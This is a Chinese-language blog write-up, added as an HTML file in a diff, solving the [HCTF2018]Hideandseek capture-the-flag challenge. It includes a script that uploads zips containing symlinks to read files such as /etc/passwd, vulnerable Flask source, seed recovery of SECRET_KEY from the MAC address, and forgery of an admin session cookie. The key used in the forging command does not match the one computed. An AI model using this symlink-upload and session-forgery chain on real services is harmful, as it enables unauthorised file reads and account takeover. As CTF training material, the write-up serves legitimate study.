@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>[HCTF2018]Hideandseek | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[HCTF2018]Hideandseek</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 17, 2024&nbsp;&nbsp;20:20:27</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="HCTF2018-Hideandseek"><a href="#HCTF2018-Hideandseek" class="headerlink" title="[HCTF2018]Hideandseek"></a>[HCTF2018]Hideandseek</h2><p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411172023078.png" alt="image-20241117202323906"></p>
+<p>登陆进去是一个文件上传的页面，但是是上传zip文件，上传文件之后好像会解析内容，进行文件读取，可以想一下zip软链接，用&#x2F;etc&#x2F;passwd试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd 321</span><br><span class="line">zip -y 111.zip 321</span><br></pre></td></tr></table></figure>
+
+<p>上传生成的zip文件得到回显</p>
+<p>进行部分修改后：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_zip</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ln -s &#x27;</span> + sys.argv[<span class="number">2</span>] + <span class="string">&#x27; test_exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;zip -y test_exp.zip test_exp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    make_zip()</span><br><span class="line">    res = requests.post(sys.argv[<span class="number">1</span>], files=&#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;./test_exp.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">&#x27;rm -rf test_exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;rm -rf test_exp.zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+
+<p>运行命令：</p>
+<p>运行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /app/uwsgi.ini</span><br></pre></td></tr></table></figure>
+
+
+<p>得到内容：</p>
+<p>可以看到其源码应是&#x2F;app&#x2F;main.py，使用EXP尝试读取源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /app/main.py</span><br></pre></td></tr></table></figure>
+
+
+<p>得到其源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def hello():</span><br><span class="line">    return &quot;Hello World from Flask in a uWSGI Nginx Docker container with \</span><br><span class="line">     Python 3.6 (default)&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=80)</span><br></pre></td></tr></table></figure>
+
+<p>开始有些疑惑，但在查阅了大佬wp后，发现应该是这道题小bug，原题中的main.py文件应在&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py路径下，而本题也是，使用写好的EXP读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</span><br></pre></td></tr></table></figure>
+
+
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import flag</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*100)</span><br><span class="line">app.config[&#x27;UPLOAD_FOLDER&#x27;] = &#x27;./uploads&#x27;</span><br><span class="line">app.config[&#x27;MAX_CONTENT_LENGTH&#x27;] = 100 * 1024</span><br><span class="line">ALLOWED_EXTENSIONS = set([&#x27;zip&#x27;])</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &#x27;.&#x27; in filename and \</span><br><span class="line">           filename.rsplit(&#x27;.&#x27;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    error = request.args.get(&#x27;error&#x27;, &#x27;&#x27;)</span><br><span class="line">    if(error == &#x27;1&#x27;):</span><br><span class="line">        session.pop(&#x27;username&#x27;, None)</span><br><span class="line">        return render_template(&#x27;index.html&#x27;, forbidden=1)</span><br><span class="line"></span><br><span class="line">    if &#x27;username&#x27; in session:</span><br><span class="line">        return render_template(&#x27;index.html&#x27;, user=session[&#x27;username&#x27;], flag=flag.flag)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    username=request.form[&#x27;username&#x27;]</span><br><span class="line">    password=request.form[&#x27;password&#x27;]</span><br><span class="line">    if request.method == &#x27;POST&#x27; and username != &#x27;&#x27; and password != &#x27;&#x27;:</span><br><span class="line">        if(username == &#x27;admin&#x27;):</span><br><span class="line">            return redirect(url_for(&#x27;index&#x27;,error=1))</span><br><span class="line">        session[&#x27;username&#x27;] = username</span><br><span class="line">    return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/logout&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def logout():</span><br><span class="line">    session.pop(&#x27;username&#x27;, None)</span><br><span class="line">    return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if &#x27;the_file&#x27; not in request.files:</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line">    file = request.files[&#x27;the_file&#x27;]</span><br><span class="line">    if file.filename == &#x27;&#x27;:</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line">    if file and allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], filename)</span><br><span class="line">        if(os.path.exists(file_save_path)):</span><br><span class="line">            return &#x27;This file already exists&#x27;</span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;This file is not a zipfile&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        extract_path = file_save_path + &#x27;_&#x27;</span><br><span class="line">        os.system(&#x27;unzip -n &#x27; + file_save_path + &#x27; -d &#x27;+ extract_path)</span><br><span class="line">        read_obj = os.popen(&#x27;cat &#x27; + extract_path + &#x27;/*&#x27;)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(&#x27;rm -rf &#x27; + extract_path)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        file = None</span><br><span class="line">    </span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    if(file != None):</span><br><span class="line">        if(file.find(base64.b64decode(&#x27;aGN0Zg==&#x27;).decode(&#x27;utf-8&#x27;)) != -1):</span><br><span class="line">            return redirect(url_for(&#x27;index&#x27;, error=1))</span><br><span class="line">    return Response(file)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    #app.run(debug=True)</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=10008)</span><br></pre></td></tr></table></figure>
+
+<p>这次读取的才是真正的main.py源码<br>不对全部的源码进行分析了，直接查找所需的SECRET_KEY的值发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*100)</span><br></pre></td></tr></table></figure>
+
+
+<p>其对SECRET_KEY做了random随机处理，但random生成的随机数都是伪随机数，有一定的规律。<br>发现了其中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure>
+
+
+<p>random.seed()方法改变随机数生成器的种子，Python之random.seed()用法<br>uuid.getnode()方法以48位正整数形式获取硬件地址，也就是服务器的MAC地址</p>
+<p>若获取了服务器的MAC地址值，那么就可以构造出为伪随机的种子值，想到Linux中一切皆文件，查找到MAC地址存放在&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address文件中，读取该文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>
+
+
+<p>得到其十六进制所表示的MAC地址：</p>
+<p>通过Python3将其转换为十进制：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mac = <span class="string">&quot;02:42:ac:10:8e:10&quot;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="comment">#转成十进制</span></span><br><span class="line">mac_int = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> mac]</span><br><span class="line"><span class="comment">#转成二进制</span></span><br><span class="line">mac_bin = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> mac_int]</span><br><span class="line"><span class="comment">#转成整数</span></span><br><span class="line">mac_dec = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(mac_bin), <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(mac_dec)</span><br></pre></td></tr></table></figure>
+
+<p>运行运行<br>种子值得到2485377863184，编写Python构造SECRET_KEY的值：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">2485377863184</span>)</span><br><span class="line">SECRET_KEY = <span class="built_in">str</span>(random.random() * <span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(SECRET_KEY)</span><br></pre></td></tr></table></figure>
+
+<p>运行<br>运行后，得到SECRET_KEY的值为：74.28774432740572，使用flask-session-cookie-manager构造Session：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;50.98160837138328&quot; -t &quot;&#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p>运行后，得到加密的Session：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.ZzndHQ.kI_BgtAh87MUz4vU4W8o7oyoVu8</span><br></pre></td></tr></table></figure>
+
+
+<p>在F12中的Application中替换：</p>
+<p>刷新后，成功以admin身份登陆，得到flag：<br><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411172037747.png" alt="image-20241117203753620"></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/112475051">https://blog.csdn.net/weixin_44037296/article/details/112475051</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/11/17/HCTF2018-Hideandseek/">http://odiws.github.io/2024/11/17/HCTF2018-Hideandseek/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/zip%E8%BD%AF%E9%93%BE%E6%8E%A5/"># zip软链接</a>
+                    
+                        <a href="/tags/python-seed%E5%87%BD%E6%95%B0/"># python_seed函数</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/11/18/FBCTF2019-Products-Manager/">[FBCTF2019]Products-Manager</a>
+            
+            
+            <a class="next" rel="next" href="/2024/11/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/">[网鼎杯2020半决赛]faka</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
